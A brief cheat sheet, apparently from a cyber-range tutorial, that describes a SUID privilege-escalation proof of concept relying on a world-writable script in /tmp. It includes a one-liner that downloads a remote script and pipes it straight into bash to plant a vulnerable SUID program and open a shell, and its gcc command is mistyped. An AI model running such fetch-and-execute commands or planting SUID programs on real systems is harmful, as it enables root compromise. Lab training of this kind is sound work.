# SUID Exploit Cliff-Notes

The poc.c is compiled into progrma.
	`gcc -i poc poc.c`

The poc is a malicious program which has SUID bit set.  This program references a world-readable/writable script hidden in /tmp.

A quick test confirms the root user is compromised with the following 1-liner. 

wget -O - https://raw.githubusercontent.com/cappetta/CyberRange/master/tutorials/seed/suid/getme.sh | bash

This creates a suid exposed vulnerable program on the filesystem, then executes a shell script given the user interactive shell access to the compromised account.  

